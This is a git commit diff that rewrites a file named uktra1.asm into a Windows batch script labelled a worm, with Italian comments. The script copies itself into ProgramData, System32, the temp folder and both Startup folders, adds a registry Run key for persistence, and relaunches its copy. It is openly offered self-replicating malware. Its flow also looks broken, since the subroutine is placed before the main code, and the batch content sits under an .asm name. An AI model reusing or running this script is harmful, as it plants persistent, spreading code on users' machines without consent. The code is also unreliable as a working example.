7a093bdc960fbd121fcc781f47edf295e3b20c97
Martin449 <76888581+martino449@users.noreply.github.com>
2024-08-19 16:19:08 +0200

    Update uktra1.asm

--- uktra1.asm
+++ uktra1.asm
@@ -1,27 +1,37 @@
-include \masm32\include\windows.inc
-include \masm32\include\kernel32.inc
-include \masm32\include\user32.inc
-includelib \masm32\lib\kernel32.lib
-includelib \masm32\lib\user32.lib
+@echo off
 
-.data
-    src db 260 dup(0)         ; Path to the current batch file
-    dst db "C:\ProgramData\uktra1_Worm", 0
-    startup db "C:\Users\Public\Start Menu\Programs\Startup\uktra1_startup.bat", 0
-    msg db "@echo off", 0
+:: Imposta variabili
+set "src=%~f0"
+set "dst1=C:\ProgramData\uktra1_Worm"
+set "dst2=C:\Windows\System32\uktra1.bat"
+set "dst3=%TEMP%\uktra1.bat"
+set "startup1=C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\uktra1.bat"
+set "startup2=C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\uktra1.bat"
 
-.code
-start:
-    invoke GetModuleFileName, NULL, addr src, 260
+:: Funzione per copiare il file in una destinazione specifica e ricrearlo se manca
+:replicate
+set "target=%1"
+if not exist "%target%" (
+    copy "%src%" "%target%" >nul
+) else (
+    fc /b "%src%" "%target%" >nul || copy "%src%" "%target%" >nul
+)
+goto :eof
 
-    ; Create directory and copy file
-    invoke CreateDirectory, addr dst, NULL
-    invoke CopyFile, addr src, addr dst, FALSE
-    invoke ShellExecute, NULL, addr "open", addr dst, addr "uktra1.bat", NULL, SW_MINIMIZE
+:: Crea directory e copia il file batch in più posizioni
+if not exist "%dst1%" mkdir "%dst1%"
+call :replicate "%dst1%\uktra1.bat"
+call :replicate "%dst2%"
+call :replicate "%dst3%"
 
-    ; Write to startup batch file
-    invoke WritePrivateProfileString, NULL, NULL, addr msg, addr startup, NULL
-    invoke WritePrivateProfileString, NULL, NULL, addr "echo Esecuzione di uktra1", addr startup, NULL
+:: Copia se stesso nelle cartelle di avvio automatico
+call :replicate "%startup1%"
+call :replicate "%startup2%"
 
-    invoke ExitProcess, 0
-end start
+:: Imposta l'avvio automatico tramite il registro di sistema
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Uktra1" /t REG_SZ /d "%dst1%\uktra1.bat" /f >nul
+
+:: Esegue il file batch copiato nella directory specificata
+start /min "" "%dst1%\uktra1.bat"
+
+exit
